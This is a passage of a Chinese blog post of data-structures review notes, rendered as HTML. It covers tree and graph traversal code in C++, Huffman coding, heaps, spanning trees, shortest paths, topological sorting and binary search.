class=\"literal\">NULL</span> &amp;&amp; root-&gt;rchild==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">               <span class=\"built_in\">cout</span>&lt;&lt;root-&gt;data;</span><br><span class=\"line\">        PreOrder(root-&gt;lchild);</span><br><span class=\"line\">        PreOrder(root-&gt;rchild);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设计算法求二叉树中叶子结点个数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span>  <span class=\"title\">CountLeaf</span> <span class=\"params\">(BiNode * T)</span></span>&#123;<span class=\"comment\">// 先序遍历二叉树，以 count 返回二叉树中叶子结点数 </span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( T ==null) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">else</span>  <span class=\"keyword\">if</span> ((!T-&gt;Lchild)&amp;&amp; (!T-&gt;Rchild))<span class=\"keyword\">return</span> <span class=\"number\">1</span>;　　　     </span><br><span class=\"line\">  <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">int</span> a=CountLeaf( T-&gt;Lchild);</span><br><span class=\"line\">      <span class=\"keyword\">int</span> b = CountLeaf( T-&gt;Rchild); </span><br><span class=\"line\">                <span class=\"keyword\">return</span> a+b;   &#125;</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"二叉树遍历的非递归算法\"><a href=\"#二叉树遍历的非递归算法\" class=\"headerlink\" title=\"二叉树遍历的非递归算法\"></a>二叉树遍历的非递归算法</h3><p><strong>前序遍历</strong></p>\n<p><strong>中序遍历</strong></p>\n<p><strong>层次序遍历</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702162207234.png\" alt=\"image-20200702162207234\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>&gt;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">BinaryTree</span>&lt;T&gt;:</span>:</span><br><span class=\"line\">levelOrder (<span class=\"keyword\">void</span> (*visit) (BinTreeNode&lt;T&gt; *t)) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (root == <span class=\"literal\">NULL</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">     Queue&lt;BinTreeNode&lt;T&gt; * &gt; Q;</span><br><span class=\"line\">     BinTreeNode&lt;T&gt; *p = root;   </span><br><span class=\"line\">      Q.EnQueue (p); \t</span><br><span class=\"line\">     <span class=\"keyword\">while</span> (!Q.IsEmpty ()) &#123;</span><br><span class=\"line\">          Q.DeQueue (p);</span><br><span class=\"line\">           visit(p);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (p-&gt;leftChild != <span class=\"literal\">NULL</span>) Q.EnQueue (p-&gt;leftChild);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (p-&gt;rightChild != <span class=\"literal\">NULL</span>) Q.EnQueue (p-&gt;rightChild);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">     &#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"二叉树的计数\"><a href=\"#二叉树的计数\" class=\"headerlink\" title=\"二叉树的计数\"></a>二叉树的计数</h3><p>由先序序列确定根结点，再由中序序列找出左右子树，可唯一确定一棵二叉树！</p>\n<h2 id=\"树和森林\"><a href=\"#树和森林\" class=\"headerlink\" title=\"树和森林\"></a>树和森林</h2><p><strong>树的存储表示</strong>：树会转换成二叉树，通常用左子女，右兄弟来表示。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702164153548.png\" alt=\"image-20200702164153548\"></p>\n<h3 id=\"森林和二叉树的转换\"><a href=\"#森林和二叉树的转换\" class=\"headerlink\" title=\"森林和二叉树的转换\"></a>森林和二叉树的转换</h3><p>森林转换为二叉树 </p>\n<ol>\n<li>将森林中的每棵树转换成二叉树；</li>\n<li>从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵二叉树根结点的右孩子，当所有二叉树连起来后，此时所得到的二叉树就是由森林转换得到的二叉树。</li>\n</ol>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702174727708.png\" alt=\"image-20200702174727708\"></p>\n<h2 id=\"树与和森林的遍历\"><a href=\"#树与和森林的遍历\" class=\"headerlink\" title=\"树与和森林的遍历\"></a>树与和森林的遍历</h2><h3 id=\"深度优先遍历\"><a href=\"#深度优先遍历\" class=\"headerlink\" title=\"深度优先遍历\"></a>深度优先遍历</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702203721802.png\" alt=\"image-20200702203721802\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702203710965.png\" alt=\"image-20200702203710965\"></p>\n<p>森林和树一样。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702204931378.png\" alt=\"image-20200702204931378\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702204950852.png\" alt=\"image-20200702204950852\"></p>\n<h3 id=\"广度优先遍历\"><a href=\"#广度优先遍历\" class=\"headerlink\" title=\"广度优先遍历\"></a>广度优先遍历</h3><p>森林的层次序遍历：</p>\n<ol>\n<li>依次遍历各棵树的根节点；</li>\n<li>依次遍历各棵树根节点的所有子女；</li>\n</ol>\n<h2 id=\"哈夫曼树\"><a href=\"#哈夫曼树\" class=\"headerlink\" title=\"哈夫曼树\"></a>哈夫曼树</h2><h3 id=\"路径长度\"><a href=\"#路径长度\" class=\"headerlink\" title=\"路径长度\"></a>路径长度</h3><p>路径长度：两个结点之间的路径长度 PL 是连接两结点的路径上的分支数。</p>\n<p>树的路径长度：从树根到每一结点的路径长度之和。</p>\n<p>树的带权路径长度：设树具有n个带权值的叶子结点，从根结点到各个叶子结点的路径长度与相应叶子结点权值的乘积之和。 记为：</p>\n<p>$WPL=\\sum_{k=1}^nW_kL_k$</p>\n<h3 id=\"哈夫曼树-1\"><a href=\"#哈夫曼树-1\" class=\"headerlink\" title=\"哈夫曼树\"></a>哈夫曼树</h3><p><strong>带权路径长度达到最小的扩充二叉树为哈夫曼树。</strong></p>\n<p>特点为：</p>\n<ol>\n<li>权值越大的叶子结点越靠近根结点，而权值越小的叶子结点越远离根结点。</li>\n<li>只有度为0（叶子结点）和度为2（分支结点）的结点，不存在度为1的结点。</li>\n</ol>\n<p><strong>若哈夫曼树有n个叶节点，则总结点为2n-1个。</strong></p>\n<h3 id=\"哈夫曼编码\"><a href=\"#哈夫曼编码\" class=\"headerlink\" title=\"哈夫曼编码\"></a>哈夫曼编码</h3><p>哈夫曼编码用哈夫曼编码树来表示（左零右一）。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702230005801.png\" alt=\"image-20200702230005801\"></p>\n<p>哈夫曼编码结果：$WPL=1bit7+2bit5+3bit6=35bit$</p>\n<p>基本思想：<strong>概率大的字符用短码，概率小的用长码。</strong></p>\n<p>练习：假设用于通信的电文仅由8个字母 {a, b, c, d, e, f, g, h} 构成，它们在电文中出现的概率分别为{ 0.07, 0.19, 0.02, 0.06, 0.32, 0.03, 0.21, 0.10}，试为这8个字母设计哈夫曼编码。如果用0～7的二进制编码方案又如何？</p>\n<p>一般左面是小数，右面是大数。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200702231339888.png\" alt=\"image-20200702231339888\"></p>\n<p>$WPL＝2(0.19+0.32+0.21) + 4(0.07+0.06+0.10) +5(0.02+0.03)<br>                        =1.44+0.92+0.25=2.61 $</p>\n<h2 id=\"堆\"><a href=\"#堆\" class=\"headerlink\" title=\"堆\"></a>堆</h2><p><strong>最小堆：任一结点的关键码均小于或等于它的左右子女的关键码，位于堆顶的结点的关键码是集合中最小的，所以称为最小堆。</strong></p>\n<p><strong>最小堆的形成</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215517930.png\" alt=\"image-20200703215517930\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215541647.png\" alt=\"image-20200703215541647\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215550879.png\" alt=\"image-20200703215550879\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703215602757.png\" alt=\"image-20200703215602757\"></p>\n<h1 id=\"图\"><a href=\"#图\" class=\"headerlink\" title=\"图\"></a>图</h1><h2 id=\"图的基本概念\"><a href=\"#图的基本概念\" class=\"headerlink\" title=\"图的基本概念\"></a>图的基本概念</h2><p>有向图：图G中的每条边都是有方向的；</p>\n<p>无向图：图G中的每条边都是无方向的；</p>\n<p><strong>完全图</strong> ：图G任意两个顶点都有一条边相连接；<strong>若有 n 个顶点的无向图有 n(n-1)/2 条边, 则此图为完全无向图。</strong><br><strong>有 n 个顶点的有向图有n(n-1) 条边, 则此图为完全有向图。</strong></p>\n<p><strong>顶点的度</strong>：一个顶点v的度是与它相关联的边的条数。</p>\n<p>连通图与连通分量 ：在<strong>无向图</strong>中, 若从顶点v1到顶点v2有路径, 则称顶点v1与v2是连通的。如果图中任意一对顶点都是连通的, 则称此图是<strong>连通图</strong>。非连通图的极大连通子图叫做连通分量。</p>\n<p>==这里要分清两个概念：极大连通子图（连通分量）和极小连通子图（生成树）==</p>\n<p><strong>极大连通子图</strong></p>\n<ol>\n<li>连通图只有一个极大连通子图，就是它本身</li>\n<li>非连通图的极大连通子图就叫连通分量，每个分量都是一个连通图。</li>\n</ol>\n<p><strong>极小连通子图</strong></p>\n<ol>\n<li>一个连通图的生成树就是极小连通子图，并且极小联通子图只存在于<strong>连通图中</strong>。</li>\n<li>最明显的特点是n个结点，n-1条边。</li>\n</ol>\n<p>强连通图与强连通分量 ：在<strong>有向图</strong>中, 若对于每一对顶点vi和vj, 都存在一条从vi到vj和从vj到vi的路径, 则称此图是<strong>强连通图</strong>。非强连通图的极大强连通子图叫做强连通分量。</p>\n<p><strong>生成树  ：一个连通图的生成树是其极小连通子图，在 n 个顶点的情形下，有 n-1 条边。</strong></p>\n<h2 id=\"图的存储结构\"><a href=\"#图的存储结构\" class=\"headerlink\" title=\"图的存储结构\"></a>图的存储结构</h2><h3 id=\"邻接矩阵表示\"><a href=\"#邻接矩阵表示\" class=\"headerlink\" title=\"邻接矩阵表示\"></a>邻接矩阵表示</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004031516.png\" alt=\"image-20200703004031516\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004326822.png\" alt=\"image-20200703004326822\"></p>\n<p>特点：完全图的邻接矩阵中，对角元素全为0，其余全为1。</p>\n<p><strong>网络的邻接矩阵</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703004532397.png\" alt=\"image-20200703004532397\"></p>\n<p><strong>邻接矩阵法优点：</strong></p>\n<p>容易实现图的操作，如：求某顶点的度、判断顶点之间是否有边（弧）、找顶点的邻接点等等。</p>\n<p><strong>邻接矩阵法缺点：</strong></p>\n<p>n个顶点需要n*n个单元存储边(弧);空间效率为O(n2)。 对稀疏图而言尤其浪费空间。</p>\n<h3 id=\"邻接表表示\"><a href=\"#邻接表表示\" class=\"headerlink\" title=\"邻接表表示\"></a>邻接表表示</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703005244186.png\" alt=\"image-20200703005244186\"></p>\n<p>特点：若图中有n个顶点，a条边</p>\n<ol>\n<li>无向图中，用邻接表表示，需要n个顶点结点，2a个边结点。</li>\n<li>有向图中，用邻接表表示，若不考虑逆邻接表，只需 n 个顶点结点，a 个边结点。</li>\n</ol>\n<p><strong>网络的邻接表</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703010111783.png\" alt=\"image-20200703010111783\"></p>\n<h2 id=\"图的遍历\"><a href=\"#图的遍历\" class=\"headerlink\" title=\"图的遍历\"></a>图的遍历</h2><h3 id=\"深度优先遍历（DFS）\"><a href=\"#深度优先遍历（DFS）\" class=\"headerlink\" title=\"深度优先遍历（DFS）\"></a>深度优先遍历（DFS）</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703011229751.png\" alt=\"image-20200703011229751\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//连通图的深度遍历 </span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>, <span class=\"title\">class</span> <span class=\"title\">E</span>&gt; </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">DFS</span> (<span class=\"title\">Graph</span>&lt;T, E&gt;&amp; <span class=\"title\">G</span>, <span class=\"title\">int</span> <span class=\"title\">v</span>, <span class=\"title\">bool</span> <span class=\"title\">visited</span>[]) &#123;</span>     </span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; G.getValue(v) &lt;&lt; <span class=\"string\">' '</span>;        <span class=\"comment\">//访问顶点v     </span></span><br><span class=\"line\">\tvisited[v] = <span class=\"literal\">true</span>;            <span class=\"comment\">//作访问标记     </span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> w = G.getFirstNeighbor (v);     <span class=\"comment\">//第一个邻接顶点     </span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (w != <span class=\"number\">-1</span>) &#123; <span class=\"comment\">//若邻接顶点w存在       </span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ( !visited[w] ) DFS(G, w, visited);   <span class=\"comment\">//若w未访问过, 递归访问顶点w         </span></span><br><span class=\"line\">\tw = G.getNextNeighbor (v, w); <span class=\"comment\">//下一个邻接顶点    </span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//图的深度优先搜索算法 </span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>, <span class=\"title\">class</span> <span class=\"title\">E</span>&gt;  </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">DFSTraverse</span> (<span class=\"title\">Graph</span>&lt;T, E&gt;&amp; <span class=\"title\">G</span>, <span class=\"title\">const</span> <span class=\"title\">T</span>&amp; <span class=\"title\">v</span>) &#123;</span> </span><br><span class=\"line\"><span class=\"comment\">//从顶点v出发对图G进行深度优先遍历的主过程     </span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i, loc, n = G.NumberOfVertices();    <span class=\"comment\">//顶点个数    </span></span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> *visited = <span class=\"keyword\">new</span> <span class=\"keyword\">bool</span>[n];          <span class=\"comment\">//创建辅助数组     </span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; n; i++) visited [i] = <span class=\"literal\">false</span>; <span class=\"comment\">//辅助数组初始化     </span></span><br><span class=\"line\">\tloc = G.getVertexPos(v);    </span><br><span class=\"line\">\tDFS (G, loc, visited); <span class=\"comment\">//从顶点0开始深度优先搜索  </span></span><br><span class=\"line\">\t<span class=\"keyword\">delete</span> [] visited;           <span class=\"comment\">//释放visited </span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"广度优先遍历（BFS）\"><a href=\"#广度优先遍历（BFS）\" class=\"headerlink\" title=\"广度优先遍历（BFS）\"></a>广度优先遍历（BFS）</h3><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703012717115.png\" alt=\"image-20200703012717115\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//图的广度优先搜索算法 </span></span><br><span class=\"line\"><span class=\"keyword\">template</span> &lt;<span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">T</span>, <span class=\"title\">class</span> <span class=\"title\">E</span>&gt; </span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">void</span> <span class=\"title\">BFS</span> (<span class=\"title\">Graph</span>&lt;T, E&gt;&amp; <span class=\"title\">G</span>, <span class=\"title\">const</span> <span class=\"title\">T</span>&amp; <span class=\"title\">v</span>) &#123;</span>     </span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i, w, n = G.NumberOfVertices();   <span class=\"comment\">//图中顶点个数   </span></span><br><span class=\"line\">\t<span class=\"keyword\">bool</span> *visited = <span class=\"keyword\">new</span> <span class=\"keyword\">bool</span>[n];     </span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; n; i++) visited[i] = <span class=\"literal\">false</span>;     </span><br><span class=\"line\">\t<span class=\"keyword\">int</span> loc = G.getVertexPos (v);  <span class=\"comment\">//取顶点号     </span></span><br><span class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; G.getValue (loc) &lt;&lt; <span class=\"string\">' '</span>;  <span class=\"comment\">//访问顶点v    </span></span><br><span class=\"line\">\tvisited[loc] = <span class=\"literal\">true</span>;           <span class=\"comment\">//做已访问标记            </span></span><br><span class=\"line\">\tQueue&lt;<span class=\"keyword\">int</span>&gt; Q;  </span><br><span class=\"line\">  Q.EnQueue (loc);   <span class=\"comment\">//顶点进队列, 实现分层访问 图的广度优先搜索算法 </span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (!Q.IsEmpty()) &#123; <span class=\"comment\">//循环, 访问所有结点         </span></span><br><span class=\"line\">\t\tQ.DeQueue (loc);         </span><br><span class=\"line\">\t\tw = G.getFirstNeighbor (loc);  <span class=\"comment\">//第一个邻接顶点         </span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> (w != <span class=\"number\">-1</span>) &#123;  <span class=\"comment\">//若邻接顶点w存在            </span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!visited[w]) &#123;  <span class=\"comment\">//若未访问过  </span></span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; G.getValue (w) &lt;&lt; ‘ ’; <span class=\"comment\">//访问           </span></span><br><span class=\"line\">\t\t\t\tvisited[w] = <span class=\"literal\">true</span>;               </span><br><span class=\"line\">\t\t\t\tQ.EnQueue (w);   <span class=\"comment\">//顶点w进队列                </span></span><br><span class=\"line\">\t\t\t&#125;           </span><br><span class=\"line\">\t\t\tw = G.getNextNeighbor (loc, w); <span class=\"comment\">//找顶点loc的下一个邻接点         </span></span><br><span class=\"line\">\t\t&#125; </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\"><span class=\"keyword\">delete</span> [] visited; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"最小生成树\"><a href=\"#最小生成树\" class=\"headerlink\" title=\"最小生成树\"></a>最小生成树</h2><p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703020829072.png\" alt=\"image-20200703020829072\"></p>\n<p>画出该图的DFS和BFS生成树</p>\n<p>DFS：</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703020930287.png\" alt=\"image-20200703020930287\"></p>\n<p>BFS：<img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021006557.png\" alt=\"image-20200703021006557\"></p>\n<h3 id=\"Prim算法\"><a href=\"#Prim算法\" class=\"headerlink\" title=\"Prim算法\"></a>Prim算法</h3><p>特点：将顶点归并</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021313306.png\" alt=\"image-20200703021313306\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021437904.png\" alt=\"image-20200703021437904\"></p>\n<h3 id=\"Kruskal算法\"><a href=\"#Kruskal算法\" class=\"headerlink\" title=\"Kruskal算法\"></a>Kruskal算法</h3><p>特点：将边归并</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021202383.png\" alt=\"image-20200703021202383\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703021225017.png\" alt=\"image-20200703021225017\"></p>\n<h2 id=\"最短路径\"><a href=\"#最短路径\" class=\"headerlink\" title=\"最短路径\"></a>最短路径</h2><h3 id=\"非负权值的单源最短路径\"><a href=\"#非负权值的单源最短路径\" class=\"headerlink\" title=\"非负权值的单源最短路径\"></a>非负权值的单源最短路径</h3><p><strong>Dijkstra算法</strong></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703022317587.png\" alt=\"image-20200703022317587\"></p>\n<h2 id=\"AOV网\"><a href=\"#AOV网\" class=\"headerlink\" title=\"AOV网\"></a>AOV网</h2><p><strong>AOV网</strong>：在一个有向图中，用顶点表示活动，用有向边表示活动先后次序的执行。这种有向图叫做顶点表示活动的AOV网络。</p>\n<p><strong>拓扑排序</strong>：按照有向图给出的次序关系，将图中顶点排成一个线性序列，对于有向图中没有限定次序关系的顶点，则可以人为加上任意的次序关系。<strong>由此所得顶点的线性序列称为拓扑有序序列</strong>，<strong>构造有向图的一个拓扑序列的过程称为拓扑排序</strong>。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024430846.png\" alt=\"image-20200703024430846\"></p>\n<p>eg：</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024708515.png\" alt=\"image-20200703024708515\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703024726671.png\" alt=\"image-20200703024726671\"></p>\n<h1 id=\"搜索\"><a href=\"#搜索\" class=\"headerlink\" title=\"搜索\"></a>搜索</h1><h2 id=\"折半搜索\"><a href=\"#折半搜索\" class=\"headerlink\" title=\"折半搜索\"></a>折半搜索</h2><p><strong>基本思想</strong>：折半搜索时, 先求位于搜索区间正中的对象的下标mid，用其关键码与给定值x比较:Element[mid].key == x，搜索成功；Element[mid].key &gt; x，把搜索区间缩小到表的前半部分，继续折半搜索；Element[mid].key &lt; x，把搜索区间缩小到表的后半部分，继续折半搜索。</p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703221308152.png\" alt=\"image-20200703221308152\"></p>\n<p><img src=\"/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/image-20200703221322312.png\" alt=\"image-20200703221322312\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">BinSearch1</span><span class=\"params\">(<span class=\"keyword\">int</span> r[ ], <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;                                  <span class=\"comment\">//数组r[1] ~ r[n]存放查找集合</span></span><br><span class=\"line\">    low = <span class=\"number\">1</span>; high = n;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (low &lt;= high)                   </span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">       mid = (low + high) / <span class=\"number\">2</span>;            </span><br><span class=\"line\">       <span class=\"keyword\">if</span> (k &lt; r[mid])  high = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">       <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (k &gt; r[mid])  low = mid + <span class=\"number\">1</span>; </span><br><span class=\"line\">              <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">BinSearch2</span><span class=\"params\">(<span class=\"keyword\">int</span> r[ ], <span class=\"keyword\">int</span> low, <span class=\"keyword\">int</span> high, <span class=\"keyword\">int</span> k)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;                              <span class=\"comment\">//数组r[1] ~ r[n]存放查找集合</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (low &gt; high) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">       mid = (low + high) / <span class=\"number\">2</span>;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (k &lt; r[mid]) </span><br><span class=\"line\">           <span class=\"keyword\">return</span> BinSearch2(r, low, mid<span class=\"number\">-1</span>, k);</span><br><span class=\"line\">       <span 